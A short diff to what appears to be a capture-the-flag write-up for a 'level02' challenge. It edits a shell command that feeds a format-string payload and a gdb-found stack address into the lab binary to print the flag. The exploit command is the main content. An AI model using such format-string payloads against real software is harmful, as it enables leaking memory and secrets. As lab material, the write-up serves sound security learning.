@@ -19,5 +19,5 @@ Via gdb we saw that the address of the `pass_content` buffer is `0x7fffffffe570`
 ## Commands
 
 ```bash
-(python -c "print('%p|' + '%c'*6 + ' || Flag: %s')"; python -c "print('\x70\xe5\xff\xff\xff\x7f')") | ./level02
+(python -c "print('%c'*7 + ' || Flag: %s')"; python -c "print('\x70\xe5\xff\xff\xff\x7f')") | ./level02
 ```
